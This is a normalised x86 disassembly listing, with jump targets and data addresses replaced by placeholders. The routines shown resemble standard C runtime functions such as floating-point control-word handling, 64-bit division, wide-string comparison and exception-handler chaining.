mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_10012714
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_100127a2
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_10012842
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_10012714
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_100127a2
push eax
mov [ ebp - 0xc ] eax
call sub_1000e6db
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10012b54
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_10012d40
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10012d86
push 0xc
push r--data
call sub_10009700
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setne al
cmp eax ebx
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] edi
push edi
call sub_10009249
pop ecx
mov [ ebp - 0x4 ] ebx
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_10009745
retn
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push edi
call sub_1000a215
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012e88
mov eax [ ebp - 0x1c ]
push edi
call sub_1000eb5d
mov esi eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
push edi
call sub_10006aae
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_1000ebf9
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10012e92
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_100056cc
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_10013232
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_1000ec2d
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10012f40
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10012fea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10012e92
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_10012e92
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_100130ed
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012fea
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_10013180
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10013232
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_10013261
pop ecx
pop ecx
sub_10013261
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_10013290
push sub_100132e8
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_100132e8
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_1000d685
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
push ebx
call sub_10013500
add esp 0x4
or eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
cmp esi 0xffffffff
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
mov eax [ edi + ecx * 4 + 0x4 ]
or eax eax
je r-xdata
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
xor ebx ebx
xor ecx ecx
xor edx edx
xor esi esi
xor edi edi
call eax
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10013401
add esp 0x8
mov edi [ ebx + 0x8 ]
push ebx
call sub_1000d620
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_1000d685
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_1000d735
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
mov eax [ edi + ecx * 4 + 0x8 ]
xor ebx ebx
xor ecx ecx
xor edx edx
xor esi esi
xor edi edi
call eax
sub_10013401
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
pop esi
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_1000d560
pop ecx
test eax eax
je r-xdata
push [ ebp + 0xc ]
push esi
call [ rw-data ]
pop ecx
pop ecx
sub_10013440
mov edi edi
push ebp
mov ebp esp
push ebx
xor eax eax
or edx 0xffffffff
push esi
cmp ecx 0xffffffff
je r-xdata
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ebx [ esi + ecx * 4 ]
mov esi [ ebx + 0x8 ]
sub esi edi
and esi 0xfffff000
cmp esi edx
je r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebx ]
cmp ecx 0xffffffff
jne r-xdata
sub ecx edi
and ecx 0xfffff000
mov esi ecx
cmp esi edx
je r-xdata
push esi
push edi
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax + 0xc ]
cmp esi ecx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp esi ecx
jb r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn
test [ eax + 0x24 ] 0x20000000
je r-xdata
mov edx [ eax + 0x8 ]
add edx ecx
cmp esi edx
jb r-xdata
push esi
push edi
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
add edx ecx
cmp esi edx
jb r-xdata
mov edx esi
test [ eax + 0x24 ] 0x20000000
je r-xdata
mov edx esi
sub_10013500
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009760
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ ebp - 0x1c ] edx
test dl 0x3
je r-xdata
mov eax [ fs : 0x18 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x20 ] ecx
cmp edx ecx
jb r-xdata
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0xc ]
mov [ ebp - 0x24 ] edi
cmp edi 0xffffffff
je r-xdata
cmp edx [ eax + 0x4 ]
jb r-xdata
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
xor eax eax
mov ecx edx
cmp [ ecx + 0x4 ] 0x0
je r-xdata
cmp esi eax
jae r-xdata
inc eax
add ecx 0xc
cmp eax edi
jbe r-xdata
mov ebx 0x1
mov esi [ ecx ]
cmp esi 0xffffffff
je r-xdata
test ebx ebx
je r-xdata
mov eax edx
and eax 0xfffff000
mov [ ebp - 0x20 ] eax
xor esi esi
mov ecx [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x8 ]
cmp eax [ ebp - 0x20 ]
jb r-xdata
push 0x1c
lea eax [ ebp - 0x40 ]
push eax
push edx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
mov ebx [ esi * 8 + rw-data ]
mov edi [ esi * 8 + rw-data ]
cmp ebx eax
jne r-xdata
cmp eax ecx
jae r-xdata
cmp [ ebp - 0x28 ] 0x1000000
je r-xdata
inc esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
push edi
call sub_1000d4d0
add esp 0x4
test eax eax
je r-xdata
mov edi [ ebp - 0x3c ]
push edi
call sub_1000d4d0
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ecx
jge r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x24 ]
call sub_10013440
add esp 0x4
test eax eax
je r-xdata
test [ ebp - 0x2c ] 0xcc
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx edi
push edx
push edi
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x1c ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_10013440
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx edi
push ecx
push edi
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
test esi esi
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
sub ecx edi
push ecx
push edi
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
mov eax 0x1
mov ecx rw-data
xchg [ ecx ] eax
test eax eax
jne r-xdata
mov edx 0x1
mov eax rw-data
xchg [ eax ] edx
test edx edx
jne r-xdata
mov eax [ ebp - 0x20 ]
cmp [ esi * 8 + rw-data ] eax
je r-xdata
mov edi [ rw-data ]
mov eax edi
test edi edi
jle r-xdata
test esi esi
mov ecx [ rw-data ]
lea esi [ ecx - 0x1 ]
test esi esi
js r-xdata
test eax eax
jne r-xdata
lea ecx [ edi * 8 + rw-data ]
mov eax rw-data
xor edx edx
xchg [ eax ] edx
xor eax eax
test esi esi
js r-xdata
cmp ecx 0x10
jge r-xdata
cmp [ esi * 8 + rw-data ] eax
je r-xdata
mov ecx [ ebp - 0x3c ]
mov [ eax * 8 + rw-data ] ecx
cmp edi 0xf
lea esi [ eax + 0xf ]
jg r-xdata
dec eax
sub ecx 0x8
test eax eax
jg r-xdata
jmp r-xdata
lea esi [ ecx - 0x1 ]
inc ecx
mov [ rw-data ] ecx
mov ebx [ esi * 8 + rw-data ]
mov edi [ esi * 8 + rw-data ]
dec esi
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x3c ]
test esi esi
js r-xdata
mov esi edi
mov edx [ ecx ]
cmp edx [ ebp - 0x20 ]
je r-xdata
mov ecx [ eax * 8 + rw-data ]
mov edx [ eax * 8 + rw-data ]
mov [ eax * 8 + rw-data ] ebx
mov [ eax * 8 + rw-data ] edi
mov ebx ecx
mov edi edx
inc eax
cmp eax esi
jle r-xdata
jle r-xdata
jmp r-xdata
cmp edi 0x10
jge r-xdata
mov eax rw-data
lea ebx [ esi + 0x1 ]
jmp r-xdata
test esi esi
